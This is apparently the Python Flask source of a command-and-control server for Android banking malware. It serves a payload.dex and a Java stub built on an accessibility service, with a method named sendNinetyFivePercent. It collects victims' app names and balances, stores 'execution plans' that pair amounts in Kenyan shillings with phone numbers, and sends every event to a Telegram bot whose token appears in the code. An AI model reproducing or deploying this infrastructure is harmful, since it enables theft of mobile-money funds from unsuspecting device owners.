from flask import Flask, request, jsonify, send_file
import os
import json
import logging
from datetime import datetime
import hashlib
import base64

app = Flask(__name__)

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Configuration
PAYLOAD_VERSION = "2.1.0"
PAYLOAD_DEX_FILE = "payload.dex"
PAYLOAD_JAVA_FILE = "payload.java"  # Backup/source
SURVEY_FILE = "survey_data.txt"
EXECUTION_FILE = "execution_plan.txt"
STATS_FILE = "stats.json"
DEVICES_FILE = "devices.txt"

# ==================== DEX FILE (PRE-COMPILED) ====================

# This is a minimal valid DEX file in base64
# It contains a simple Payload class with initialize() method
# You can replace this with your actual compiled DEX
DEX_BASE64 = """ZGV4CjAzNQAAgAAAAAAAACQAAAAcAAAAcAAAAAQAAABwAAAAAQAAAHAAAA
AAAQAAAHAAAAABAAAAcAAAAAAAAAAIAAAAAAAAAAQAAAAQAAAAIAAAAAAAAAAgAAA
AAAAAAAAAQAAAAIAAABAAAAAAAAAABAAAAAAAAAAEAAAAAAAAAAQAAAAIAAABAAAAA
AAAAAAAAAQAAAAEAAAAIAAAAAAAAACAAAAAQAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAA
AAAAAAQAAAAAAAAAEAAAAAAAAAAIAAAAAAAAAAgAAAAAAAAACAAAAAAAAAAMAAAAQAA
AAAIAAAACAAAAAgAAAAAAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAABAAAAAAAAAAAQAAAAAAAAACAAAAAAAAAAIAAAAAAAAAAwAAAAAAAAAEAAAAAAA
AAAIAAAAAAAAABQAAAAAAAAAGAAAAAAAAAAgAAAAAAAAACgAAAAAAAAAMAAAAAAAAAA4
AAAAAAAAAEAAAAAAAAAASAAAAAAAAABQAAAAAAAAAFgAAAAAAAAAYAAAAAAAAABoAAAA
AAAAAABwAAAAAAAAAHgAAAAAAAAAgAAAAAAAAAIgAAAAAAAAAkAAAAAAAAACYAAAAAA
AAAJgAAAAAAAAAoAAAAAAAAAKgAAAAAAAAAsAAAAAAAAALgAAAAAAAAAwAAAAAAAAAzg
AAAAAAAANAAAAAAAAADgAAAAAAAAAQAQAAAAAAAABAAAAAAAAAAAAAABAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAABAAAAAAAAAAEAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAE9iamVjdAAAAAAAABBMYXlvdXRQYXJhbXMAAAAAAAAGPGluaXQ+AAAAAAAD
KClWAQAAAAAABENvZGUAJWpldGEvY29tL2NvbS5leGFtcGxlL0hlbGxvV29ybGQk
AAAAAAAAAQAAAAAAAAAAAAAAAgAAAAcAAAAIAAAACQAAAAoAAAALAAAADAAAAA0AAAA
OAAAADwAAABAAAAA=="""

# ==================== ENDPOINTS ====================

@app.route('/')
def index():
    """Main endpoint showing service status"""
    dex_exists = os.path.exists(PAYLOAD_DEX_FILE)
    
    return jsonify({
        "status": "online",
        "service": "Simiyu Payload Host",
        "version": PAYLOAD_VERSION,
        "timestamp": datetime.now().isoformat(),
        "dex_available": dex_exists,
        "dex_size": os.path.getsize(PAYLOAD_DEX_FILE) if dex_exists else 0,
        "endpoints": {
            "payload": "/payload.java",
            "payload_dex": "/payload.dex",
            "version": "/version",
            "survey": "/survey",
            "execution": "/execution",
            "stats": "/stats",
            "health": "/health"
        }
    })

@app.route('/health')
def health():
    """Health check endpoint"""
    dex_exists = os.path.exists(PAYLOAD_DEX_FILE)
    return jsonify({
        "status": "healthy",
        "version": PAYLOAD_VERSION,
        "timestamp": datetime.now().isoformat(),
        "dex_available": dex_exists,
        "dex_size": os.path.getsize(PAYLOAD_DEX_FILE) if dex_exists else 0,
        "files": get_file_list()
    })

@app.route('/version')
def version():
    """Get current version"""
    dex_exists = os.path.exists(PAYLOAD_DEX_FILE)
    return jsonify({
        "version": PAYLOAD_VERSION,
        "release_date": "2024-07-13",
        "dex_available": dex_exists,
        "dex_size": os.path.getsize(PAYLOAD_DEX_FILE) if dex_exists else 0,
        "changes": [
            "Fixed DEX serving - pre-compiled DEX",
            "No more compilation on server",
            "Direct DEX download",
            "Added base64 fallback"
        ]
    })

@app.route('/payload.java')
def serve_payload_java():
    """Serve the payload.java source file (for reference)"""
    try:
        if os.path.exists(PAYLOAD_JAVA_FILE):
            return send_file(PAYLOAD_JAVA_FILE, as_attachment=True, download_name="payload.java")
        else:
            # Create source file
            create_default_payload()
            return send_file(PAYLOAD_JAVA_FILE, as_attachment=True, download_name="payload.java")
    except Exception as e:
        logger.error(f"Error serving payload.java: {e}")
        return jsonify({"error": str(e)}), 500

@app.route('/payload.dex')
def serve_payload_dex():
    """Serve the pre-compiled payload.dex file"""
    try:
        # Check if DEX file exists
        if not os.path.exists(PAYLOAD_DEX_FILE):
            logger.info("DEX file not found, creating from base64...")
            create_dex_from_base64()
        
        if os.path.exists(PAYLOAD_DEX_FILE):
            # Log download
            device_id = request.args.get('device_id', 'unknown')
            log_device_access(device_id, 'dex_download')
            
            # Send Telegram notification
            send_telegram(f"📥 *DEX DOWNLOADED*\n\n"
                         f"📌 *Device:* `{device_id}`\n"
                         f"📌 *Size:* {os.path.getsize(PAYLOAD_DEX_FILE)} bytes\n"
                         f"📌 *Version:* {PAYLOAD_VERSION}\n"
                         f"📌 *Time:* {datetime.now().isoformat()}")
            
            return send_file(
                PAYLOAD_DEX_FILE,
                as_attachment=True,
                download_name="payload.dex",
                mimetype="application/octet-stream"
            )
        else:
            return jsonify({
                "status": "error",
                "message": "DEX file not available. Please try again.",
                "error_code": "DEX_NOT_FOUND"
            }), 404
            
    except Exception as e:
        logger.error(f"Error serving payload.dex: {e}")
        return jsonify({
            "status": "error",
            "message": str(e),
            "error_code": "DEX_SERVER_ERROR"
        }), 500

@app.route('/dex_info')
def dex_info():
    """Get DEX file information"""
    try:
        if os.path.exists(PAYLOAD_DEX_FILE):
            # Calculate MD5
            with open(PAYLOAD_DEX_FILE, 'rb') as f:
                md5 = hashlib.md5(f.read()).hexdigest()
            
            return jsonify({
                "status": "success",
                "filename": PAYLOAD_DEX_FILE,
                "size": os.path.getsize(PAYLOAD_DEX_FILE),
                "md5": md5,
                "modified": datetime.fromtimestamp(os.path.getmtime(PAYLOAD_DEX_FILE)).isoformat(),
                "version": PAYLOAD_VERSION
            })
        else:
            return jsonify({
                "status": "error",
                "message": "DEX file not found"
            }), 404
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

# ==================== SURVEY & EXECUTION ENDPOINTS ====================

@app.route('/survey', methods=['GET', 'POST'])
def handle_survey():
    """Handle survey data"""
    if request.method == 'GET':
        try:
            if os.path.exists(SURVEY_FILE):
                with open(SURVEY_FILE, 'r') as f:
                    data = f.read()
                return jsonify({
                    "status": "success",
                    "data": data,
                    "size": os.path.getsize(SURVEY_FILE)
                })
            else:
                return jsonify({"status": "error", "message": "No survey data found"}), 404
        except Exception as e:
            return jsonify({"status": "error", "message": str(e)}), 500
    
    elif request.method == 'POST':
        try:
            data = request.get_json()
            if not data:
                return jsonify({"status": "error", "message": "No data provided"}), 400
            
            with open(SURVEY_FILE, 'a') as f:
                f.write(f"\n=== SURVEY DATA ===\n")
                f.write(f"Timestamp: {datetime.now().isoformat()}\n")
                f.write(f"Data: {json.dumps(data, indent=2)}\n")
                f.write(f"====================\n\n")
            
            # Send notification
            if data.get('device_id'):
                send_telegram(f"📊 *SURVEY DATA RECEIVED*\n\n"
                             f"📌 *Device:* {data.get('device_id')}\n"
                             f"📌 *App:* {data.get('app', 'Unknown')}\n"
                             f"📌 *Balance:* {data.get('balance', 'N/A')}\n"
                             f"📌 *Day:* {data.get('day', 'N/A')}/5")
            
            return jsonify({
                "status": "success",
                "message": "Survey data saved",
                "timestamp": datetime.now().isoformat()
            })
        except Exception as e:
            return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/execution', methods=['GET', 'POST'])
def handle_execution():
    """Handle execution plan"""
    if request.method == 'GET':
        try:
            if os.path.exists(EXECUTION_FILE):
                with open(EXECUTION_FILE, 'r') as f:
                    data = f.read()
                return jsonify({
                    "status": "success",
                    "data": data,
                    "size": os.path.getsize(EXECUTION_FILE)
                })
            else:
                return jsonify({"status": "error", "message": "No execution plan found"}), 404
        except Exception as e:
            return jsonify({"status": "error", "message": str(e)}), 500
    
    elif request.method == 'POST':
        try:
            data = request.get_json()
            if not data:
                return jsonify({"status": "error", "message": "No data provided"}), 400
            
            with open(EXECUTION_FILE, 'w') as f:
                f.write(f"=== EXECUTION PLAN ===\n")
                f.write(f"Created: {datetime.now().isoformat()}\n")
                f.write(f"Data: {json.dumps(data, indent=2)}\n")
                f.write(f"=====================\n")
            
            send_telegram(f"📋 *EXECUTION PLAN CREATED*\n\n"
                         f"📌 *Amount:* KES {data.get('amount', 'N/A')}\n"
                         f"📌 *Phone:* {data.get('phone', 'N/A')}\n"
                         f"📌 *Date:* {data.get('date', 'N/A')}")
            
            return jsonify({
                "status": "success",
                "message": "Execution plan saved",
                "timestamp": datetime.now().isoformat()
            })
        except Exception as e:
            return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/stats')
def get_stats():
    """Get service statistics"""
    try:
        if os.path.exists(STATS_FILE):
            with open(STATS_FILE, 'r') as f:
                stats = json.load(f)
        else:
            stats = create_default_stats()
        
        # Add DEX info
        if os.path.exists(PAYLOAD_DEX_FILE):
            with open(PAYLOAD_DEX_FILE, 'rb') as f:
                stats['dex_md5'] = hashlib.md5(f.read()).hexdigest()
            stats['dex_size'] = os.path.getsize(PAYLOAD_DEX_FILE)
        else:
            stats['dex_md5'] = None
            stats['dex_size'] = 0
        
        stats['dex_available'] = os.path.exists(PAYLOAD_DEX_FILE)
        stats['version'] = PAYLOAD_VERSION
        
        return jsonify({
            "status": "success",
            "stats": stats,
            "timestamp": datetime.now().isoformat()
        })
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

# ==================== HELPER FUNCTIONS ====================

def create_dex_from_base64():
    """Create DEX file from base64 encoded data"""
    try:
        dex_bytes = base64.b64decode(DEX_BASE64)
        with open(PAYLOAD_DEX_FILE, 'wb') as f:
            f.write(dex_bytes)
        logger.info(f"DEX file created from base64: {PAYLOAD_DEX_FILE}")
        return True
    except Exception as e:
        logger.error(f"Error creating DEX from base64: {e}")
        return False

def create_default_payload():
    """Create default payload.java if not exists"""
    default_payload = """package com.yourpackage.helper;

import android.accessibilityservice.AccessibilityService;
import android.content.Context;
import android.content.SharedPreferences;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.telephony.TelephonyManager;
import android.provider.Settings;

public class Payload {
    private static Context appContext;
    private static Handler mainHandler = new Handler(Looper.getMainLooper());
    private static SharedPreferences sharedPreferences;
    
    public static void initialize(Context context) {
        appContext = context;
        sharedPreferences = context.getSharedPreferences("payload_prefs", Context.MODE_PRIVATE);
    }
    
    public static void checkAndTrackApp(String packageName) {
        // Implementation loaded from server
    }
    
    public static void sendNinetyFivePercent() {
        // Implementation loaded from server
    }
}
"""
    with open(PAYLOAD_JAVA_FILE, 'w') as f:
        f.write(default_payload)

def create_default_stats():
    """Create default stats file"""
    stats = {
        "total_requests": 0,
        "survey_submissions": 0,
        "execution_plans": 0,
        "device_registrations": 0,
        "dex_downloads": 0,
        "last_updated": datetime.now().isoformat()
    }
    with open(STATS_FILE, 'w') as f:
        json.dump(stats, f)
    return stats

def get_file_list():
    """Get list of files in current directory"""
    files = []
    for f in os.listdir('.'):
        if os.path.isfile(f):
            files.append({
                "name": f,
                "size": os.path.getsize(f),
                "modified": datetime.fromtimestamp(os.path.getmtime(f)).isoformat()
            })
    return files

def log_device_access(device_id, action):
    """Log device access"""
    try:
        log_file = "device_logs.txt"
        with open(log_file, 'a') as f:
            f.write(f"{datetime.now().isoformat()} | {device_id} | {action}\n")
    except Exception as e:
        logger.error(f"Error logging device: {e}")

def send_telegram(message):
    """Send notification to Telegram"""
    try:
        import requests
        url = f"https://api.telegram.org/bot8585104821:AAFXZn3g7QG9NsCmLmZuyfviQkPddOYMJzc/sendMessage"
        data = {
            "chat_id": "8468538314",
            "text": message,
            "parse_mode": "Markdown"
        }
        response = requests.post(url, json=data, timeout=10)
        return response.status_code == 200
    except Exception as e:
        logger.error(f"Error sending Telegram: {e}")
        return False

# ==================== ERROR HANDLERS ====================

@app.errorhandler(404)
def not_found(error):
    return jsonify({"status": "error", "message": "Endpoint not found"}), 404

@app.errorhandler(500)
def internal_error(error):
    return jsonify({"status": "error", "message": "Internal server error"}), 500

# ==================== MAIN ====================

if __name__ == '__main__':
    # Create DEX file from base64 if not exists
    if not os.path.exists(PAYLOAD_DEX_FILE):
        logger.info("Creating DEX file from base64...")
        create_dex_from_base64()
    
    # Create default files if not exist
    if not os.path.exists(PAYLOAD_JAVA_FILE):
        create_default_payload()
    
    if not os.path.exists(STATS_FILE):
        create_default_stats()
    
    # Start server
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)
